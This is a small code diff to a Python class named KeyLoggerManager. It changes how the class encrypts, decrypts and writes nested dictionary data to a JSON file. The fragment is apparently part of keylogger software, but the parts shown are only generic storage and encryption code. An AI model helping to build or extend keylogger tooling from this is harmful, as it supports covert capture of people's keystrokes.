@@ -41,7 +41,7 @@ class KeyLoggerManager:
         for key , val in data.items():
             temp_dict[key] = dict()
             for k , v in val.items():
-                 temp_dict[key][k] =self.__encryption.encrypt(v)
+                 temp_dict[key][k] = self.__encryption.encrypt(v)
         return temp_dict
 
 
@@ -55,7 +55,7 @@ class KeyLoggerManager:
         for key, val in data.items():
             temp_dict[key] = dict()
             for k, v in val.items():
-                temp_dict[key][k] = self.__encryption.decrypt(json.loads(v))
+                temp_dict[key][k] = self.__encryption.decrypt(v)
         return temp_dict
 
     def _write_to_file(self,data:dict, file_name:str):
@@ -63,6 +63,7 @@ class KeyLoggerManager:
         Writes text to a json file
         """
         self.writer.write(data ,file_name)
+
 
 
 
